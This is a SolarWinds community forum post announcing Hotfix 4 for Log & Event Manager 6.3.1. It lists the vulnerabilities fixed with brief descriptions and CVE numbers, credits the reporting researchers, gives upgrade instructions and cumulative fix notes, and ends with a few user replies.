1. Use the auto-upgrade feature to automatically upgrade Agents if the feature is enabled.

2. If the auto-upgrade feature is disabled, or if there are communication issues between agents and the LEM Manager, follow the manual installation steps included in the "Install Hotfix 4 on Agents (manual steps)" section of the ReadMe included in the hotfix download.

**Mitigation** **and Upgrades**

To mitigate these issues, SolarWinds recommends upgrading to the latest version of LEM, v6.3.1 & applying Hotfix 4. SolarWinds also recommends [changing the CMC password](https://support.solarwinds.com/Success_Center/Log_Event_Manager_%28LEM%29/Changing_the_CMC_password) to ensure default credentials are not in use.

**Vulnerability Overview**

As of the date of this announcement, SolarWinds is not aware of any instance where a vulnerability remedied in Hotfix 4 has been actively exploited.

Common Vulnerabilities and Exposures (CVE) identifiers for the vulnerabilities remedied are not available at the time of this announcement, but will be added once assigned by a CVE Numbering Authority.

**Credit Statement**

SolarWinds would like to credit Baker Hamilton at [Bishop Fox](https://www.bishopfox.com/), Matt Bergin & Hank Leininger at [KoreLogic](https://www.korelogic.com/) & [Mehmet Ince](https://www.mehmetince.net/) for reporting these vulnerabilities.

To report a potential vulnerability to SolarWinds, please email PSIRT@solarwinds.com

**Descriptions**

**CMC command injection** – allows an attacker to inject commands to escape the restricted shell.

**Arbitrary command injection** – allows an authenticated user to execute arbitrary commands from the CMC restricted shell - CVE-2017-7647

**Access Control** – allows an authenticated used to browse the LEM server’s filesystem and read contents of arbitrary files - CVE-2017-7646

**Postgres Database Service** – allows hardcoded credentials access to the Postgres database service via IPv6. IPv4 is not affected by this vulnerability.

**Arbitrary File Read** – allows an attacker to edit the SSH logon banner & read arbitrary files.

**Privilege Escalation** – allows an attacker to run certain commands as a privileged user - CVE-2017-5198 & CVE-2017-5199.

**Cumulative Hotfix**

The following fixes from Hotfix 1, Hotfix 2, and Hotfix 3 are also included in this Hotfix:

* Scheduled nDepth search results limited to 50,000 events.
* Fixed ImportCert error when importing certificate after command failure.
* Fixed an issue that display the IP address instead of the FQDN/hostname in 'All Installed Agents'.
* Fixed an issue when an L4 Database appliance started with only 128MB of memory.
* Updates the Java platform to the latest version.
* Fixed an out-of-memory issue that occurs when sending alerts to the console. The fix improves performance when a large number of events are sent to the console.
* Fixed agent-manager communication issues - periodic disconnect and others.
* Fixed an issue with nDepth log retention (logging missing date in raw records).
* Fixed an issue that prevents logging in to LEM if using UserPrincipalName with a custom alias or SAMAccountName with NETBIOS.
* Added the ability to use sub-alias LDAP environments.
* Removed field limitations in the normalized alert database.
* Fixed a log rotate issue that causes connectors to stop working if log lines are too long.
* Fixed a single sign-on SSO issue that occurs if a Kerberos ticket is unusually long because a user belongs to many groups.
* Added the ability to configure custom LDAP groups for authentication.
* Set an agent memory limit for agents upgraded from older versions.
* Fixed other agent-manager communication issues.
* Additional improvements to assist customer support, including improved logging & added diagnostics.
* The threat-feeds server certificate changed - LEM cannot download thread-feeds IPs.
* Unable to use a domain containing a dash in the LDAP configuration.
* Unable to recover a password when HTTP is disabled.
* Exceptions during a fast evaluation are not logged.

**Notes:**

* This fix is applicable to LEM 6.3.1 only

* Cancel

* ![FormerMember](https://thwack.solarwinds.com/cfs-filesystemfile/__key/communityserver-components-imagefileviewer/communityserver-components-avatars_2E00_/default.png_2D00_44x44x2.png?_=637458163242412058)

  0

  FormerMember

  [over 7 years ago](https://thwack.solarwinds.com/products/security-event-manager-sem/f/forum/33491/lem-v6-3-1-hot-fix-4-is-now-available/55238)

  Hey Jamie, some of the formatting of those cumulative hotfix notes is a little wacky, might be some copy/paste gremlins in there. ![emoticons_wink.png](/resized-image/__size/300x0/__key/communityserver-discussions-components-files/34/2158.emoticons_5F00_wink.png)

  + Cancel

  + Vote Up
    0
    Vote Down
  + Cancel
* [![aabdul](https://thwack.solarwinds.com/cfs-filesystemfile/__key/communityserver-components-imagefileviewer/communityserver-components-avatars-00-00-05-70-74/4UD0M37MVPUH.png_2D00_44x44x2.png?_=637495507893985440)](/members/aabdul)

  0

  [aabdul](/members/aabdul)

  [over 7 years ago](https://thwack.solarwinds.com/products/security-event-manager-sem/f/forum/33491/lem-v6-3-1-hot-fix-4-is-now-available/55246)

  Thanks Jame, it is really helpful ![emoticons_happy.png](/resized-image/__size/300x0/__key/communityserver-discussions-components-files/34/6014.emoticons_5F00_happy.png)

  + Cancel

  + Vote Up
    0
    Vote Down
  + Cancel
* [![dodo123](https://thwack.solarwinds.com/cfs-filesystemfile/__key/communityserver-components-imagefileviewer/communityserver-components-avatars-00-00-19-98-30/4UD986B99DGT.jpg_2D00_44x44x2.jpg?_=637517879665244666)](/members/dodo123)

  0

  [dodo123](/members/dodo123)

  [over 7 years ago](https://thwack.solarwinds.com/products/security-event-manager-sem/f/forum/33491/lem-v6-3-1-hot-fix-4-is-now-available/55254)

  applied hotfix, was sent this link from a colleague. Not 100% accurate took longer to take a snapshot of the box.

  [Fistful of flaws blow away SolarWinds network appliances • The Register](http://www.theregister.co.uk/2017/04/27/brace_of_bad_bugs_blow_away_solarwinds_network_appliances/ "http://www.theregister.co.uk/2017/04/27/brace_of_bad_bugs_blow_away_solarwinds_network_appliances/")

  + Cancel

  + Vote Up
    0
    Vote Down
  + Cancel

SolarWinds solutions are rooted in our deep connection to our user base in the THWACK® online community.
More than 200,000 members are here to solve problems, share technology and best practices, and directly
contribute to our product development process.

[SolarWinds](http://www.solarwinds.com/)
[Customer Success Center](https://support.solarwinds.com/Success_Center)
[Certification](https://support.solarwinds.com/solarwinds-certified-professional-program)
[SolarWinds Lab](/events-missions-musings/events/solarwinds-lab/)
[Link Accounts](/p/link-accounts)

[About THWACK](/resources/thwack-command-center)
[Blogs](/resources/b)
[Federal & Government](https://www.solarwinds.com/federal-government/it-management-solutions-for-government)
[Edit Settings](/user/settings)
[Free Tools & Trials](/free-tools-trials)

[Legal Documents](https://www.solarwinds.com/legal/legal-documents)
[Terms of Use](/p/terms-of-use)
[Privacy](https://www.solarwinds.com/legal/privacy)
[California Privacy Rights](https://www.solarwinds.com/legal/privacy#california-privacy-rights)
[Security Information](https://www.solarwinds.com/information-security)

©2021 SolarWinds Worldwide, LLC. All Rights Reserved.


